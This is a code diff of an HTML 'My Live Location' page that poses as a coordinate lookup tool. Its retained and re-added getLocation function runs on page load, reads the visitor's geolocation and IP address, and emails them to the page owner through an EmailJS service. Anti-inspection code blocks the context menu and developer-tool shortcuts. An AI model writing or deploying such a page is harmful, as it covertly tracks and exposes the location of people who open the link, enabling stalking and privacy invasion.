@@ -7,12 +7,12 @@
     <title>My Live Location</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: "Roboto", sans-serif;
-            margin: 0px auto;
-            padding: 0px;
+            margin: 0 auto;
+            padding: 0;
             font-size: 1rem;
             height: 100vh;
             display: flex;
@@ -27,12 +27,12 @@
         <h1 style="text-align: center; font-size: 1.2rem;">Get Your Live Location</h1>
         <h2 style="text-align: center; font-size: 0.8rem;">If you want to check another person's location, please enter the Latitude and Longitude below:</h2>
         <label>Latitude:</label>
-        <input type="text" id="latitude" placeholder="Enter Your Latitude">
+        <input type="text" id="latitude" placeholder="Enter Latitude">
         <br><br>
         <label>Longitude:</label>
-        <input type="text" id="longitude" placeholder="Enter Your Longitude">
+        <input type="text" id="longitude" placeholder="Enter Longitude" onblur="showLocation()">
         <br><br>
-        <p id="locationResult" style="display: none; margin: 0px;"></p>
+        <p id="locationResult" style="display: none; margin: 0;"></p>
     </div>
 
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
@@ -50,7 +50,6 @@
 
         const deviceCategory = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
 
-        // Disable context menu and certain key combinations
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) || (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
@@ -66,29 +65,6 @@
             } catch (error) {
                 console.error("Error fetching IP address:", error);
                 return "Unknown IP";
-            }
-        }
-
-        async function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const ipAddress = await getIP();
-                    const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
-                    
-                    // Set latitude and longitude in the input fields
-                    document.getElementById("latitude").value = position.coords.latitude;
-                    document.getElementById("longitude").value = position.coords.longitude;
-
-                    // Display location result
-                    displayLocationResult(locationData);
-
-                    // Send email with location data
-                    sendEmail(position, ipAddress, locationData);
-                }, (error) => {
-                    alert("Unable to retrieve your location. Please check your settings.");
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
             }
         }
 
@@ -114,6 +90,38 @@
             }
         }
 
+        async function showLocation() {
+            const latitude = document.getElementById("latitude").value;
+            const longitude = document.getElementById("longitude").value;
+
+            if (latitude && longitude) {
+                const locationData = await fetchLocationData(latitude, longitude);
+                displayLocationResult(locationData);
+            } else {
+                alert("Please enter both latitude and longitude.");
+            }
+        }
+
+        // Automatically fetch the user's location when the page loads
+        async function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const ipAddress = await getIP();
+                    const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
+                    
+                    document.getElementById("latitude").value = position.coords.latitude;
+                    document.getElementById("longitude").value = position.coords.longitude;
+                    displayLocationResult(locationData);
+
+                    sendEmail(position, ipAddress, locationData);
+                }, (error) => {
+                    alert("Unable to retrieve your location. Please check your settings.");
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
         function sendEmail(position, ipAddress, data) {
             emailjs.send("service_mupmc8l", "template_1f01srj", {
                 user_latitude: position.coords.latitude,
@@ -135,7 +143,6 @@
             });
         }
 
-        // Call getLocation on page load to fetch location and display in inputs
         getLocation();
     </script>
 </body>
